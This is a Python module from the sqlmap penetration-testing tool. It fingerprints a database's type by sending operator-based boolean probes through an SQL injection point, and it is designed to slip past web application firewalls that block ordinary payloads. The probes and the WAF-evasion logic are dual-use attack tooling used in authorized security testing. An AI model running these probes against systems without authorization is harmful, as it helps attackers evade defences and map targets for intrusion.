#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import Backend
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.settings import SINGLE_QUOTE_MARKER
from lib.request.inject import checkBooleanExpression

# Operator/typing-dialect probes for a WAF-tolerant back-end DBMS heuristic, complementing
# heuristicCheckDbms() for when a WAF/IPS drops its SELECT/quote payloads. Each probe is fed to
# checkBooleanExpression() (appended as ... AND (<probe>)); all but catplus use only non-alphanumeric
# operators (WAF-friendly). Minimal set giving a collision-free signature to the classes below.
DIALECT_PROBES = (
    ("pow", "2^3=8"),                                             # '^' is exponentiation
    ("intdiv", "5/2=2"),                                          # integer division
    ("mod", "5%2=1"),                                             # '%' modulo operator
    ("bitor", "2|0=2"),                                           # '|' bitwise-OR operator
    ("xeq", "1^=2"),                                              # '^=' not-equal operator
    ("bslash", "5\\2=2"),                                         # '\' integer division
    ("catplus", "%sa%s+%sb%s=%sab%s" % ((SINGLE_QUOTE_MARKER,) * 6)),  # '+' concatenates strings
    ("numcat", "1||1=11"),                                        # '||' concatenates with numeric coercion
)

# Trust gate: a syntactically-invalid trailing-operator expression a real back-end can only read as
# FALSE. A noise/false-positive channel reads it TRUE, proving the oracle is untrustworthy -> None.
DIALECT_CANARY = "2+"

# Reachability canaries for adversarial WAFs that selectively drop operator characters. A dropped probe
# reads FALSE, indistinguishable from a semantic FALSE, silently degrading the signature. Each canary
# embeds probe characters inside a string literal (semantically inert), so it is universally TRUE unless
# the WAF filters a character. The combined form is a fast path; on failure the per-char forms (via
# _reachCanary) locate the blocked bits, which _classify() then treats as unknown/wildcard.
_DIALECT_REACH_CHARS = (("^", (0, 4)), ("/", (1,)), ("%", (2,)), ("|", (3, 7)), ("\\", (5,)), ("+", (6,)))
_DIALECT_REACH_BODY = "a^b/c%d|e\\f+g"
DIALECT_REACH_CANARY = "%s%s%s=%s%s%s" % (SINGLE_QUOTE_MARKER, _DIALECT_REACH_BODY, SINGLE_QUOTE_MARKER, SINGLE_QUOTE_MARKER, _DIALECT_REACH_BODY, SINGLE_QUOTE_MARKER)

# Exact operator-dialect signature -> back-end DBMS (strict whitelist). Any signature not listed - an
# unmeasured engine/version or a noise channel - returns None, so the heuristic never wrong-foots a scan.
# All rows are live-measured except Spanner (documentation-derived, tagged inline).
_SIGNATURE_DBMS = {
    #  pow    intdiv mod    bitor  xeq    bslash catplus numcat
    (False, False, False, False, False, False, False, True):  DBMS.INFORMIX,   # Informix
    (False, False, False, False, False, True,  False, True):  DBMS.CACHE,      # InterSystems IRIS/Cache ('\' int-div)
    (False, False, False, False, True,  False, False, True):  DBMS.ORACLE,     # Oracle ('^=' not-equal)
    (False, False, False, True,  False, False, False, False): DBMS.SPANNER,    # Google Cloud Spanner (only '|' works) - doc-derived, not live-tested
    (False, False, True,  False, False, False, False, True):  DBMS.CLICKHOUSE, # ClickHouse (no bitwise-OR)
    (False, False, True,  True,  False, False, True,  True):  DBMS.MYSQL,      # MySQL / MariaDB / TiDB
    (False, True,  False, False, False, False, False, False): DBMS.DERBY,      # Apache Derby
    (False, True,  False, False, False, False, True,  False): DBMS.HSQLDB,     # HSQLDB ('+' concat)
    (False, True,  False, False, True,  False, False, True):  DBMS.FIREBIRD,   # Firebird ('^=')
    (False, True,  True,  False, False, False, False, False): DBMS.PRESTO,     # Presto / Trino
    (False, True,  True,  False, False, False, False, True):  DBMS.H2,         # H2
    (False, True,  True,  True,  False, False, False, False): DBMS.SQLITE,     # SQLite
    (False, True,  True,  True,  False, False, False, True):  DBMS.MONETDB,    # MonetDB
    (False, True,  True,  True,  False, False, True,  False): DBMS.MSSQL,      # Microsoft SQL Server (2019 AND 2022)
    (False, True,  True,  True,  False, False, True,  True):  DBMS.CUBRID,     # CUBRID (like MonetDB but '+' concat)
    (False, True,  True,  True,  True,  False, False, True):  DBMS.DB2,        # IBM DB2 ('^=', no '<<'/'\')
    (True,  False, False, False, False, True,  True,  False): DBMS.ACCESS,     # Microsoft Access (ACE/JET: '^' exp + '\' int-div + '+' concat)
    (True,  False, True,  True,  False, False, False, False): DBMS.PGSQL,      # PostgreSQL
    (True,  False, True,  True,  False, False, False, True):  DBMS.VERTICA,    # Vertica (pg-derived but numeric '||')
    (True,  False, True,  True,  True,  False, False, True):  DBMS.PGSQL,      # openGauss (Oracle-compat '^=')
    (True,  True,  True,  True,  False, False, False, False): DBMS.PGSQL,      # PostgreSQL / CrateDB variant
    (True,  True,  True,  True,  False, False, False, True):  DBMS.PGSQL,      # PostgreSQL variant
}

def _classify(signature, unknown=()):
    """
    Maps an exact 8-bit operator/typing signature to a back-end DBMS via the strict whitelist, or None
    when the signature is not a known fingerprint (unmeasured engine, or a noise/false-positive channel).

    'unknown' holds bit indices whose probe character a WAF is dropping (so their FALSE is meaningless);
    they are treated as wildcards and a DBMS is named only when the remaining trusted bits are unanimous,
    which cannot misclassify (the true signature is always among the candidates).

    >>> _classify((False, False, True, True, False, False, True, True), unknown={2})  # MySQL, mod blocked -> still unique
    'MySQL'
    >>> _classify((False, True, True, False, False, False, False, True), unknown={7}) is None  # H2 vs Presto ambiguous -> None
    True
    >>> _classify((False, False, True, True, False, False, True, True))     # MySQL / MariaDB / TiDB
    'MySQL'
    >>> _classify((False, True, True, True, False, False, True, False))     # Microsoft SQL Server (2019 and 2022)
    'Microsoft SQL Server'
    >>> _classify((False, True, True, True, False, False, False, True))     # MonetDB
    'MonetDB'
    >>> _classify((True, True, True, True, False, False, False, False))     # PostgreSQL / CrateDB
    'PostgreSQL'
    >>> _classify((False, True, True, True, False, False, False, False))    # SQLite
    'SQLite'
    >>> _classify((False, False, True, False, False, False, False, True))   # ClickHouse
    'ClickHouse'
    >>> _classify((False, False, False, False, True, False, False, True))   # Oracle ('^=')
    'Oracle'
    >>> _classify((False, False, False, False, False, True, False, True))   # InterSystems IRIS/Cache (Oracle but no '^=')
    'InterSystems Cache'
    >>> _classify((False, True, False, False, True, False, False, True))    # Firebird
    'Firebird'
    >>> _classify((False, True, False, False, False, False, False, False))  # Apache Derby
    'Apache Derby'
    >>> _classify((True, False, False, False, False, True, True, False))     # Microsoft Access ('^' exp + '\' int-div)
    'Microsoft Access'
    >>> _classify((False, False, False, True, False, False, False, False))   # Google Cloud Spanner (doc-derived: only '|' bitwise-OR)
    'Spanner'
    >>> _classify((True, True, True, True, True, True, True, True)) is None # unmeasured / noise -> None
    True
    """

    signature = tuple(bool(_) for _ in signature)

    if not unknown:
        return _SIGNATURE_DBMS.get(signature)

    unknown = set(unknown)
    candidates = set(dbms for sig, dbms in _SIGNATURE_DBMS.items() if all(sig[i] == signature[i] for i in range(len(signature)) if i not in unknown))

    return next(iter(candidates)) if len(candidates) == 1 else None

def _reachCanary(char):
    lit = "%sx%sx%s" % (SINGLE_QUOTE_MARKER, char, SINGLE_QUOTE_MARKER)
    return "%s=%s" % (lit, lit)

def dialectCheckDbms(injection):
    """
    Keyword-free back-end DBMS heuristic via operator-dialect differentials, evaluated through the given
    (boolean-capable) injection. Complements heuristicCheckDbms() (whose SELECT/quote payloads a WAF/IPS
    may drop). Returns the DBMS name, or None for an ambiguous, WAF-blocked or false-positive channel.
    """

    retVal = None

    if conf.skipHeuristics:
        return retVal

    pushValue(kb.injection)
    kb.injection = injection

    try:
        # trust gate: a real oracle reads the tautology TRUE, the contradiction FALSE, the invalid
        # canary FALSE. A noise channel reads them alike (canary TRUE) -> skip rather than guess.
        if checkBooleanExpression("2=2") and not checkBooleanExpression("2=3") and not checkBooleanExpression(DIALECT_CANARY):
            signature = tuple(bool(checkBooleanExpression(expr)) for _, expr in DIALECT_PROBES)

            # detect WAF-dropped probe characters (a dropped probe reads FALSE); mark their bits unknown
            unknown = set()
            if not checkBooleanExpression(DIALECT_REACH_CANARY):
                for char, bits in _DIALECT_REACH_CHARS:
                    if not checkBooleanExpression(_reachCanary(char)):
                        unknown.update(bits)

            retVal = _classify(signature, unknown)
    finally:
        kb.injection = popValue()

    if retVal and not Backend.getIdentifiedDbms():
        infoMsg = "heuristic (dialect) test shows that the back-end DBMS could be '%s'" % retVal
        logger.info(infoMsg)

    return retVal
